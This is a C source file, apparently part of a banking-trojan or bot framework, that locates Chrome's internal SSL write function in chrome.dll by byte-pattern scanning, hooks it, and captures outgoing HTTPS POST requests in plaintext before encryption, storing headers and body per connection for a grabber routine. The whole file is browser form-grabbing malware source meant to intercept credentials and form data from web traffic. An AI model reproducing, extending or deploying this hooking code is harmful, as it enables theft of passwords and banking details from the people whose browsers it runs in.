#include "chromehooks.h"

#include "nss3.h"
#include "httpgrabber.h"

#include "..\common\mem.h"
#include "..\common\utils.h"
#include "..\common\string.h"
#include "..\common\hooking.h"

extern bot_t bot;

typedef __int32 (__cdecl* ptssl_Write)(void* fd, const void* buffer, __int32 amount);

#define CHROME_PR_WRITE_SIGNATURE "\x55\x8B\xEC\x56\x8B\x75\x00\x83\x7E\x24\x00\x75\x23\x68\x00"
#define CHROME_PR_WRITE_MASK "xxxxxx?xxx?xxx?"

DWORD dwPR_Write;

static nss3_request_t* pRequests;
static DWORD chromeConnectionCount;
static RTL_CRITICAL_SECTION csChrome;

ptssl_Write ossl_Write;

static DWORD findConnection(void* fd)
{
	DWORD i;

	for(i = 0; i < chromeConnectionCount; i++)
	{
		if(pRequests[i].fd == fd)
			return i;
	}

	return -1;
}

static void addConnection(void* fd, const LPSTR Header, DWORD dwHeaderLength)
{
	DWORD i, dwIndex;
	nss3_request_t* pRequest;

	pRequest = NULL;

	CWA(RtlEnterCriticalSection)(&csChrome);

	for(i = 0; i < chromeConnectionCount; i++)
	{
		if(pRequests[i].fd == NULL)
		{
			pRequest = &pRequests[i];
			dwIndex = i;
			break;
		}
	}

	if(pRequest == NULL && memreallocEx(&pRequests, sizeof(nss3_request_t) * (chromeConnectionCount + 1)))
	{
		dwIndex = chromeConnectionCount++;
		pRequest = &pRequests[dwIndex];
	}

	if(pRequest != NULL)
	{
		memzero(pRequest, sizeof(nss3_request_t));
		ParseNss3RequestFromBuffer(pRequest, Header);
		pRequest->fd = fd;
		pRequest->Header = StrCopyA(Header, dwHeaderLength);
	}

	CWA(RtlLeaveCriticalSection)(&csChrome);
}

static void removeConnection(DWORD dwIndex)
{
	nss3_request_t* pRequest;
	DWORD dwNewCount;

	if((pRequest = &pRequests[dwIndex]) != NULL)
	{
		if(pRequest->Header != NULL)
			memfree(pRequest->Header);

		if(pRequest->Data != NULL)
			memfree(pRequest->Data);

		memzero(pRequest, sizeof(nss3_request_t));
	}

	dwNewCount = chromeConnectionCount;

	while(dwNewCount > 0 && pRequests[dwNewCount - 1].fd == NULL) dwNewCount--;

	if(dwNewCount != chromeConnectionCount)
	{
		if(dwNewCount == 0)
		{
			memfree(pRequests);
			pRequests = NULL;
		}
		else memreallocEx(&pRequests, sizeof(nss3_request_t) * dwNewCount);

		chromeConnectionCount = dwNewCount;
	}
}

static void chromeReportDone(DWORD dwIndex, const LPSTR Data, DWORD dwDataLength)
{
	DWORD dwBufferLength, dwHeaderLength;
	LPSTR pszBuffer;

	nss3_request_t* pRequest;

	CWA(RtlEnterCriticalSection)(&csChrome);

	if((pRequest = &pRequests[dwIndex]) != NULL)
	{
		if((dwHeaderLength = StrLengthA(pRequest->Header)) > 0)
		{
			dwBufferLength = dwHeaderLength + dwDataLength;

			if((pszBuffer = (LPSTR)memalloc(dwBufferLength + 1)) != NULL)
			{
				memcopy(pszBuffer, pRequest->Header, dwHeaderLength);
				memcopy(pszBuffer + dwHeaderLength, Data, dwDataLength);
				pszBuffer[dwBufferLength] = 0;

				memfree(pszBuffer);
			}
		}
	}

	CWA(RtlLeaveCriticalSection)(&csChrome);
}

void initChromeHooks(HMODULE hMod)
{
	if((dwPR_Write = FindPattern((DWORD)hMod, GetModuleSize(hMod), (BYTE*)CHROME_PR_WRITE_SIGNATURE, CHROME_PR_WRITE_MASK))== 0)
		return;

	CWA(RtlInitializeCriticalSection)(&csChrome);
	chromeConnectionCount = 0;
	pRequests = NULL;
}

__int32 __cdecl ssl_Write_Callback(void* fd, const void* buffer, __int32 amount)
{
	DWORD dwIndex;
	LPSTR pszBuffer;

	if((pszBuffer = ToStringA(buffer, amount)) == NULL)
		goto finish_request;

	if((dwIndex = findConnection(fd)) == -1)
	{
		if(StrCompareStartA(pszBuffer, "POST /"))
		{
			addConnection(fd, pszBuffer, amount);
		}
	}
	else
	{

		removeConnection(dwIndex);
	}

finish_request:
	return ossl_Write(fd, buffer, amount);
}

void installChromeHooks(HMODULE hMod)
{
	unsigned int i;

	hook_t hooks[] =
	{
		{dwPR_Write, &ssl_Write_Callback, (LPVOID*)&ossl_Write, 0}
	};

	if(dwPR_Write == 0)
		return;

	for(i = 0; i < sizeof(hooks) / sizeof(hook_t); i++)
	{
		*hooks[i].lpOriginalFunction = HookRemoteFunctionEx(CURRENT_PROCESS, hooks[i].lpFunctionAddress, hooks[i].lpCallbackAddress, &hooks[i].dwLength);
	}
}

void tryInstallChromeHooks(void)
{
	HMODULE hMod;

	if((hMod = CWA(GetModuleHandleW)(L"chrome.dll")) != 0)
	{
		initChromeHooks(hMod);
		installChromeHooks(hMod);
	}
}